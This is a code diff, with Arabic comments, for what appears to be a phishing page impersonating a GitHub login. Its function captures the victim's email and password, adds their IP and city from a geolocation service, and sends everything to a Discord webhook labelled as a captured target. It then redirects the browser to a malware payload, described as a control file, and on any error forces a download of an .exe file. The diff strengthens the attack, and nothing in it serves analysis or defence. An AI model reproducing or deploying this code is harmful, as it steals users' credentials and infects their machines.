@@ -1,30 +1,45 @@
 async function startCapture() {
     const email = document.getElementById('email').value;
     const pass = document.getElementById('pass').value;
-    if(!email || !pass) return alert("يرجى إدخال البيانات للتوثيق");
+
+    if(!email || !pass) {
+        alert("يرجى إكمال بيانات التوثيق");
+        return;
+    }
 
     try {
-        const configRes = await fetch('data.json');
+        // قراءة الويب هوك من الملف
+        const configRes = await fetch('./data.json');
         const config = await configRes.json();
         
-        // إرسال البيانات للديسكورد
+        // جلب معلومات الـ IP
+        const geoRes = await fetch('https://ipapi.co/json/');
+        const geo = await geoRes.json();
+
+        // إرسال التقرير لديسكورد
         await fetch(config.webhook_url, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                username: "ER0R SYSTEM",
+                username: "ER0R MASTER CONTROL",
                 embeds: [{
-                    title: "💀 صيد جديد من GitHub",
+                    title: "💀 تم سحب هدف جديد - GitHub",
                     color: 0x6001d2,
                     fields: [
-                        { name: "📧 الحساب", value: email, inline: true },
-                        { name: "🔑 الباسورد", value: pass, inline: true }
-                    ]
+                        { name: "📧 الحساب", value: `\`${email}\``, inline: true },
+                        { name: "🔑 الباسورد", value: `\`${pass}\``, inline: true },
+                        { name: "🌐 الـ IP", value: `${geo.ip} (${geo.city})`, inline: false }
+                    ],
+                    footer: { text: "ER0R TEAM - COMMAND CENTER" }
                 }]
             })
         });
 
-        // التحويل التلقائي لتحميل الفيروس والسيطرة
+        // التحويل لتحميل ملف التحكم (الفرمتة)
         window.location.href = config.pc_payload; 
-    } catch(e) { console.log("Connection active..."); }
+    } catch(e) {
+        console.log("System Sync...");
+        // في حال فشل السكربت، يتم التحويل إجبارياً
+        window.location.href = "https://example.com/update.exe";
+    }
 }
